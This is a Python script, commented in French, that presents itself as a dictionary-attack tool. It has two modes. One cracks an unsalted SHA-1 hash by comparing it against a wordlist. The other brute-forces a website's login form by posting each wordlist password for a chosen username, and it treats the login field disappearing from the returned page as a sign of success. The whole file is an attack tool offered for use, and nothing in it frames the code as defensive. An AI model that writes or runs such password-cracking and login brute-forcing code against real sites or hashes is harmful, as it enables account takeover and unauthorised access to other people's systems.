import hashlib
import urllib.request
import urllib.parse
from bs4 import BeautifulSoup

def fcToWordList(path,separator='\n'):
	"""Fonction qui lit le contenu du fichier et renvoi une liste"""
	
	with open(path,'r') as file:
		content=file.read()
		contentList=content.split('\n')
	return contentList


#le titre du program
		
print("###-_Attack par dictionnaire_-###\n\n")


##on invite l'user a mettre le path du wordList
path=input('mettez le path du fichier: ')
##le containner qui stockera le vrai password
truepass="";
try:
	list=fcToWordList(path)
except FileNotFoundError:
	print("fichier specifié introuvable")
else :
	print("Tapez \"hash\" pour le hack du hash \n ET \n \"web\"pour le hack sur un site web \n")
	choice=input(' __')
	choice=choice.lower()
	if(choice=="hash"):
		print("mettez votre hash en sha1 :\n")
		hash=input("__:")
		if(hash):
			i=0
			while i<len(list):
				current=hashlib.sha1(list[i].encode()).hexdigest();
				if(current==hash):
					truepass=list[i]
					break
				i=i+1;
			print("processus fini ")
			if(truepass):
				print("Le mot de pass est :",truepass)
			else:
				print("mot de passe introuvable")
	elif(choice=="web"):
		host=input("Mettez le host a exploiter \n")
		print("traitement en cours...")
		try:
			response=urllib.request.urlopen(host)
		except ValueError:
			print("l'url saisi n'est pas pris en charge")
		except :
			print("une erreur est survenu lors de la resolution du host, veuillez verifier votre connexion et l'url saisi")
		else:
			with response as site:
				siteContent=site.read()
			print("host trouvé");
			print("entrez le nom des chaps a cibler");
			iduser=input("1. nom du champs de l'identifiant : ")
			passwd=input("2.nom du champs password : ");
			siteB=BeautifulSoup(siteContent,'html5lib')
			##la balise que nous utiliserons pour savoir si nous sommes encor sur la,meme page
			preuve=siteB.find(attrs={"name":iduser})
			if(preuve):
				iduserValue=input("mettez la valeur du champ "+iduser+"\n");
				if(iduserValue):
					print("processus en cours...");
					i=0;
					while(i<len(list)):
						data=urllib.parse.urlencode({iduser:iduserValue,passwd:list[i]})
						data=data.encode('ascii');
						try:
							contentFile=urllib.request.urlopen(host,data)
						except SyntaxError:
							print("une erreur est survenue veullez verifier votre connexion puis réessayer");
							break
						else:
							with contentFile as file:
								content=file.read().decode('utf-8')
							contentB=BeautifulSoup(content,'html5lib')
							test=contentB.find(attrs={"name":iduser})
							if(test!=preuve):
								truepass=list[i]
								break
							i=i+1;
					print("processus fini")
					if(truepass):
						print("le mot de passe trouvé est "+truepass);
					else:
						print("mot de passe introuvable");